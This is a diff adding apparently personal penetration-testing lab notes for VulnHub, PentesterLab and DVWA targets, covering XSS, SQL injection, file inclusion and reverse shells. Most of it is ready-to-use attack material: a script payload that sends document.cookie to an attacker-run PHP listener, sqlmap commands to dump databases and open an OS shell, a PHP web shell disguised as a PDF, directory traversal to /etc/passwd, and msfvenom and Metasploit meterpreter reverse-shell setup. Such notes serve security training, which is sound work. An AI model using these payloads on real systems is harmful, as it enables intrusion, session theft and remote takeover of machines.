@@ -536,13 +536,131 @@ Sample to attack Kioptrix
     -v - verbose mode
     -P - Passwordlist
 
+**XSS and MySQL FILE**
+
+https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/ 
+Only ISO for 64 bit
+Debian 64 and Live image
+
+*XSS*
+
+    <script>alert('xss')</script>
+
+create index.php and put it in the home directory of the user you will run it with
+
+    <?php
+        $cookie = isset($_GET["test"])?$_GET['test']:"";
+    ?>
+
+install it in a apache server run php 
+
+    service apache2 stop
+    php -S 10.0.2.6:80
+
+in the vulnerable field enter
+
+    <script>location.href='http://10.0.2.6/index.php?test='+document.cookie;</script>
 
 
+*SQL injection*
 
+https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/ 
 
+*SQLMap*
 
+Look for anything that looks like it trigger a sql query. Admin page requests posts with "id=1" in the URI. That is a good indicator that sql injection is possible here.
 
+For testing
 
+    sqlmap -u "http://10.0.2.7/admin/edit.php?id=1" --cookie=PHPSESSID=<id>
+
+For dumping
+
+    sqlmap -u "http://10.0.2.7/admin/edit.php?id=1" --cookie=PHPSESSID=<id> --dump
+
+For getting a shell
+
+    sqlmap -u "http://10.0.2.7/admin/edit.php?id=1" --cookie=PHPSESSID=<id> --os-shell
+
+**Local File Inclusion (LFI)**
+
+https://www.vulnhub.com/entry/pentester-lab-php-include-and-post-exploitation,79/ 
+
+Nikto
+
+    nikto -h 10.0.2.8
+
+ Directory Traversal
+
+    ../../../../../../../../../../etc/passwd
+
+doesn't work
+Adding a null byte does the trick until php 5.3
+
+    ../../../../../../../../../../etc/passwd%00
+
+Inject a file -> Submit allows to upload a pdf. Create a file that has a pdf header but contains php otherwise.
+
+*shell.pdf*
+
+    %PDF-1.4
+
+    <?php
+        system($_GET["cmd"]);
+    ?>
+
+that goes to upload page and can trigger a command
+
+    http://10.0.2.8/index.php?page=uploads/shell.pdf%00&cmd=whoami
+
+Shellcode to create a reverse shell
+
+    https://github.com/GammaG/php-reverse-shell
+
+Get the php file and change the ip and port where the shell should connect to.
+
+    nc -nvlp 4444
+
+    In Browser:
+    http://10.0.2.8/index.php?page=uploads/reverseshell.pdf%00
+
+*Privilage Escalation*
+
+find a folder with full rights -> tmp
+
+**Remote File Inclusion (RFI)**
+
+Host a file yourself and let the victim download it
+
+*Damn Vulnerable Web Application (DVWA)*
+
+    http://www.dvwa.co.uk/
+
+*Generate Reverse shell msfvenom*
+
+    msfvenom -p php/meterpreter/revese_tcp LHOST=<host ip> LPORT=4444 >> exploit.php
+
+host the file with python server
+
+    service apache2 stop
+    python -m SimpleHTTPServer 80
+
+python give you debug information
+
+*Setup meterpreter*
+
+alternative to nc - only once allowed in OSCP better use nc
+
+    msfconsole
+    use exploit/multi/handler
+    set LHOST 192.168.134.129
+    set LPORT 4444
+    set payload php/meterpreter/reverse_tcp
+    exploit
+
+on DVWA the page is called via parameter "?page=" enter here the malicious page as goal
+
+    dvwa.com/vulnerabilites/fi/?page=http://10.0.2.6/exploit.php
 
 
 
